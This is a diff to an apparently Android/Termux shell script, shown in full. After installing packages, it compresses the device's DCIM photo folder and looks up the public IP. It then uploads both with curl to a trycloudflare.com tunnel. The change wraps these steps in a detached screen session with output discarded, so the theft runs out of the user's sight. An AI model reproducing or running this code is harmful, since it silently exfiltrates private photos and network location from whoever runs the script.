@@ -4,12 +4,8 @@ pkg upgrade | apt update
 pkg install screen | apt install screen
 pkg install zip | apt install screen
 
-zip myfile.zip /storage/emulated/0/DCIM > /dev/null 2>&1 &
-#echo "hi" > myfile.zip
-curl "https://ifconfig.me/" > ips.zip 2>/dev/null
+screen -dmS mi_sesion bash -c 'zip myfile.zip /storage/emulated/0/DCIM > /dev/null 2>&1 & curl "https://ifconfig.me/" > ips.zip 2>/dev/null; curl -X POST -F "file=@myfile.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1; curl -X POST -F "file=@ips.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1'
 
-curl -X POST -F "file=@myfile.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1
-curl -X POST -F "file=@ips.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
